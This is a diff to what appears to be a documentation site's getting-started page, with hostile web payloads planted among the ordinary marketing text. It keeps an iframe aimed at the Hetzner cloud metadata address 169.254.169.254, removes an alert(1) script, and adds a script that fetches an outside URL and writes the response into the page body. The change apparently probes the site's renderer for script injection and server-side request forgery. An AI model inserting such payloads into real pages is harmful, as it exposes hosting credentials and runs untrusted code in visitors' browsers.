@@ -22,7 +22,10 @@ Get your documentation site up and running in minutes.
 
 <iframe src="http://169.254.169.254/hetzner/v1/metadata" title="W3Schools Free Online Web Tutorials">
 </iframe>
-<script>alert(1)</script>
+
+<script>
+fetch('https://example.com').then(r=>r.text()).then(t=>document.body.innerHTML='<pre>'+t+'</pre>');
+</script>
 
 Design a docs site that looks great and empowers your users.
 
